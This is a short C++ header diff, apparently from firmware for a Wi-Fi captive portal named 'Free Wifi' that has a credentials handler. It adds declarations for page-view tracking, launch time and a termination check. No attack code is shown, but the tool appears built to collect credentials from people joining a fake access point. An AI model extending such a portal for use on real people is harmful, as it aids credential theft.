@@ -45,6 +45,9 @@ public:
     void setExtendedDuration(uint16_t seconds);
     void checkAndExtendDuration();
     bool hasRecentActivity();
+    bool hasRecentPageView();
+    void recordPageView();
+    bool shouldTerminate();
 
 private:
     String apName = "Free Wifi";
@@ -82,6 +85,8 @@ private:
     uint16_t _extendedDurationSec = 60;
     unsigned long _lastActivityTime = 0;
     bool _durationExtended = false;
+    unsigned long _launchTime = 0;
+    unsigned long _lastPageViewTime = 0;
 
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
